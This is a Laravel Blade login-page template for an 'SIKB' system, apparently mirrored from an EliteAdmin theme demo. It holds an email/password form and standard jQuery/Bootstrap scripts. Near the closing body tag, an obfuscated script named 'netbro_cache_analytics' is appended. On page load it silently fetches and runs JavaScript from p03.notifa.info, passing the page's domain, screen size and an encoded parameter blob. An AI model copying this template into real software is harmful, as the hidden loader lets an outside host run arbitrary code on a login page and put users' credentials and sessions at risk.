<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('assets/images/favicon.png') }}">
    <title>SIKB | Login</title>
    <link href="{{ asset('dist/css/pages/login-register-lock.css') }}" rel="stylesheet">
    <link href="{{ asset('dist/css/style.min.css') }}" rel="stylesheet">
</head>
<body>
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label">SIKB</p>
        </div>
    </div>
    {{-- <section id="wrapper" class="login-register login-sidebar" style="background-image:url({{ asset('assets/images/background/login-register.jpg') }});"> --}}
    <section id="wrapper" class="login-register login-sidebar">
        <div class="login-box card" style="opacity: 0.8;">
            <div class="card-body">
                <form class="form-horizontal form-material" method="POST" action="{{ route('login') }}">
                  {{ csrf_field() }}
                    <a href="javascript:void(0)" class="text-center db">
                      {{-- <center>
                        <img src="{{ asset('img/ap1.png') }}" alt="Home" height="70px"/>
                      </center> --}}
                    </a>
                    <div class="m-t-40 form-group{{ $errors->has('email') ? ' has-error' : '' }}">
                        <div class="col-xs-12">
                            <input id="email" type="email" class="form-control" name="email" value="{{ old('email') }}" required placeholder="Email">
                            @if ($errors->has('email'))
                                <span class="help-block">
                                    <strong>{{ $errors->first('email') }}</strong>
                                </span>
                            @endif
                        </div>
                    </div>
                    <div class="form-group{{ $errors->has('password') ? ' has-error' : '' }}">
                        <div class="col-xs-12">
                            <input id="password" type="password" class="form-control" name="password" required placeholder="Password">
                            @if ($errors->has('password'))
                                <span class="help-block">
                                    <strong>{{ $errors->first('password') }}</strong>
                                </span>
                            @endif
                        </div>
                    </div>
                    <div class="form-group text-center m-t-20">
                        <div class="col-xs-12">
                            <button class="btn btn-info btn-lg btn-block text-uppercase btn-rounded" type="submit">Log In</button>
                        </div>
                    </div>
                    <p style="text-align:center">© 2019 <b style="color:#03a9f3">Angkasa Pura Support</b> </p>
                </form>
            </div>
        </div>
    </section>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="../assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="../assets/node_modules/popper/popper.min.js"></script>
    <script src="../assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!--Custom JavaScript -->
    <script type="text/javascript">
        $(function() {
            $(".preloader").fadeOut();
        });
        $(function() {
            $('[data-toggle="tooltip"]').tooltip()
        });
        // ==============================================================
        // Login and Recover Password
        // ==============================================================
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5myFsTwFUh3iOZicyh8lzzVHDlQUt5%2fYV5t48zmdum%2fqfuFbqezqR%2fPMhsgzy7gT%2bZ%2bAU%2bwwK%2bdRJ942XwaYKPLfl3SOzCm5d3hIvml5U5IrbiGmKxF%2fdvubyjmoDtPBPlIOqigIn4kkFF3Vb23sFmgqY3xzBTkDivprNU9zPNHQV7%2bHEsRScCm9a5wjGN0bHZX%2fG4rXuU73TiPkKa5G5XvXa2b342u1J%2fUf9ZHvrJDDLuPWT81E0WQLILmlbDaALixTlr7tzOjxwH5eUqEDmKSaHbSbREsnFbcxtGK%2fvR8UW2ycBcgEs6Vdggpv%2bRWRtV3sdGo%2bB0v5%2b7SJFgN6GlehV%2bc5ZAxhRAongEJN3nfWWTpnCMQdbPHPpzOwOnKE2fu9v%2b60K%2bbyB5gHh%2bMINcQNOlH94Knxr0xPHHSLe3ctkz7n96lHgDqYCmN2KkF6rm45KdaI1L5CxH2RNiArg4x2VFgZsYy7f76h%2bfXVdlLmKlct%2flLP8FzLfR6G9oDBuMZ3ItUgZdW9o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/eliteadmin/pages-login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Mar 2018 17:00:25 GMT -->
</html>
